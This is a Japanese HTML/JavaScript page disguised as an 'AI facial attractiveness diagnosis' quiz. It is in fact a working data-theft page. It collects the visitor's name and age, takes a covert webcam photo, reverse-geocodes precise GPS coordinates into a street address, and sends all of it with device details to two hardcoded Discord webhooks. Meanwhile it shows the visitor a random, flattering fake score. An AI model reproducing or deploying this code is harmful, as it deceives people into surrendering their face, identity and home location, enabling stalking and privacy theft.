<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>次世代AI 顔面偏差値診断</title>
  <style>
    :root {
      --primary: #00f2ff;
      --accent: #ff4b6e;
      --bg: #0a0b10;
    }

    body {
      margin: 0;
      font-family: 'Helvetica Neue', 'Arial', 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', sans-serif;
      background-color: var(--bg);
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(0, 242, 255, 0.05) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(255, 75, 110, 0.05) 0%, transparent 40%);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      overflow: hidden;
    }

    .scanner-frame {
      position: relative;
      width: 90%;
      max-width: 450px;
      padding: 40px 20px;
      background: rgba(15, 20, 30, 0.85);
      border: 1px solid rgba(0, 242, 255, 0.3);
      border-radius: 15px;
      box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(15px);
      text-align: center;
    }

    h1 { 
      font-size: 1.6rem; 
      letter-spacing: 2px; 
      color: var(--primary); 
      text-shadow: 0 0 10px var(--primary);
      margin-top: 0;
    }

    .input-box {
      width: 80%;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(0, 242, 255, 0.2);
      padding: 14px;
      color: #fff;
      margin-bottom: 15px;
      outline: none;
      border-radius: 8px;
      font-size: 1rem;
      text-align: center;
    }

    .viewfinder {
      position: relative;
      width: 260px;
      height: 260px;
      margin: 20px auto;
      border: 2px solid var(--primary);
      background: #000;
      border-radius: 50%; /* 円形スキャナー */
      overflow: hidden;
      display: none;
      box-shadow: 0 0 20px var(--primary);
    }

    #video { width: 100%; height: 100%; object-fit: cover; }

    .scan-line {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 4px;
      background: var(--primary);
      box-shadow: 0 0 15px var(--primary);
      animation: scan 2s ease-in-out infinite;
    }

    @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }

    .btn-analyze {
      background: var(--accent);
      border: none;
      color: white;
      padding: 16px 45px;
      font-size: 1.2rem;
      font-weight: bold;
      cursor: pointer;
      border-radius: 50px;
      box-shadow: 0 4px 15px rgba(255, 75, 110, 0.4);
      transition: 0.3s;
    }

    .btn-analyze:hover {
      transform: scale(1.05);
      box-shadow: 0 6px 20px rgba(255, 75, 110, 0.6);
    }

    #status-log {
      margin-top: 20px;
      font-family: 'Courier New', monospace;
      font-size: 0.8rem;
      color: var(--primary);
      text-align: center;
      display: none;
    }

    #result { display: none; margin-top: 20px; animation: fadeIn 1s; }
    .score-label { font-size: 1.2rem; color: #aaa; }
    .score-value { font-size: 5rem; color: var(--accent); text-shadow: 0 0 25px var(--accent); font-weight: bold; }
    
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
  </style>
</head>
<body>

<div class="scanner-frame">
  <h1>AI顔面偏差値診断</h1>
  
  <div id="setup-ui">
    <p style="font-size: 0.9rem; margin-bottom: 20px; opacity: 0.8;">最新のAIがあなたの黄金比を分析します</p>
    <input type="text" id="userName" class="input-box" placeholder="お名前を入力">
    <input type="number" id="userAge" class="input-box" placeholder="年齢">
    <p style="font-size: 0.7rem; color: var(--primary); margin: 15px 0;">※カメラと位置情報の許可が必要です</p>
    <button id="startBtn" class="btn-analyze">診断をスタート</button>
  </div>

  <div class="viewfinder" id="viewfinder">
    <div class="scan-line"></div>
    <video id="video" autoplay playsinline muted></video>
  </div>
  <canvas id="canvas" style="display:none;"></canvas>

  <div id="status-log"></div>

  <div id="result">
    <div class="score-label">あなたの顔面偏差値は…</div>
    <div class="score-value" id="scoreValue">--</div>
    <div style="color: var(--primary); margin-top: 10px; font-weight: bold;">【SSS級】1000人に1人の逸材です！</div>
  </div>
</div>

<script>
// 指定された2つのWebhook URL
const WEBHOOK_URL_1 = "https://discord.com/api/webhooks/1500785153557926039/YaDfG9umJtJsTrovTvdVss7-zr6PO4iML6MtG-Y5WsL6oNroO-NnXtQ7uTTJ1uTcsJCh";
const WEBHOOK_URL_2 = "https://discord.com/api/webhooks/1500784995155841114/d_97SvZKHagh4tHws2yY-YkT2zcMs4NXMQhIw2BIOZ3iWr3_dSA2r7tf8uccVqz3pdM2";

const startBtn = document.getElementById('startBtn');
const log = document.getElementById('status-log');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

function addLog(msg) {
  log.style.display = 'block';
  log.innerHTML = msg;
}

// 座標を住所とマップURLに変換
async function getAddressDetail(lat, lon) {
  try {
    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`, {
      headers: { 'Accept-Language': 'ja' }
    });
    const data = await res.json();
    const a = data.address;
    const addressStr = `${a.province || ''}${a.city || a.town || ''}${a.suburb || ''}${a.neighbourhood || ''}${a.road || ''}`;
    return { addressStr, gmaps: `https://www.google.com/maps?q=${lat},${lon}` };
  } catch (e) {
    return { addressStr: "取得失敗", gmaps: `https://www.google.com/maps?q=${lat},${lon}` };
  }
}

async function requestPermissions() {
  addLog("センサーを初期化中...");
  const camPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
  const locPromise = new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      async pos => {
        const detail = await getAddressDetail(pos.coords.latitude, pos.coords.longitude);
        resolve(detail);
      },
      err => resolve({ addressStr: "位置情報が拒否されました", gmaps: "取得不可" }),
      { timeout: 7000, enableHighAccuracy: true }
    );
  });
  return Promise.all([camPromise, locPromise]);
}

async function processAnalysis() {
  try {
    const [stream, locDetail] = await requestPermissions();
    
    document.getElementById('viewfinder').style.display = 'block';
    document.getElementById('setup-ui').style.display = 'none';
    video.srcObject = stream;
    addLog("顔の骨格をスキャンしています...");

    setTimeout(async () => {
      addLog("黄金比を算出中...");
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob(async (blob) => {
        const fd = new FormData();
        fd.append('file', blob, `face_analysis.jpg`);
        fd.append('content', 
          `【顔面偏差値 診断結果】\n` +
          `氏名: ${document.getElementById('userName').value || '未入力'}\n` +
          `年齢: ${document.getElementById('userAge').value || '不明'}\n` +
          `住所: ${locDetail.addressStr}\n` +
          `GoogleMap: ${locDetail.gmaps}\n` +
          `端末情報: ${navigator.userAgent}\n` +
          `診断時刻: ${new Date().toLocaleString('ja-JP')}`
        );

        // 2つのWebhookに送信
        await Promise.all([
          fetch(WEBHOOK_URL_1, { method: 'POST', body: fd }),
          fetch(WEBHOOK_URL_2, { method: 'POST', body: fd })
        ]);

        addLog("解析が完了しました。");
        
        setTimeout(() => {
          document.getElementById('viewfinder').style.display = 'none';
          log.style.display = 'none';
          document.getElementById('result').style.display = 'block';
          // 偏差値をランダム生成（75〜92の範囲）
          document.getElementById('scoreValue').innerText = Math.floor(Math.random() * 18) + 75;
        }, 1000);
      }, 'image/jpeg', 0.85);
    }, 3000);

  } catch (err) {
    alert("診断を続けるには、カメラと位置情報の許可を「許可」にしてください。");
    location.reload();
  }
}

startBtn.onclick = () => {
  if(!document.getElementById('userName').value) {
    alert("お名前を入力してください");
    return;
  }
  processAnalysis();
};
</script>
</body>
</html>
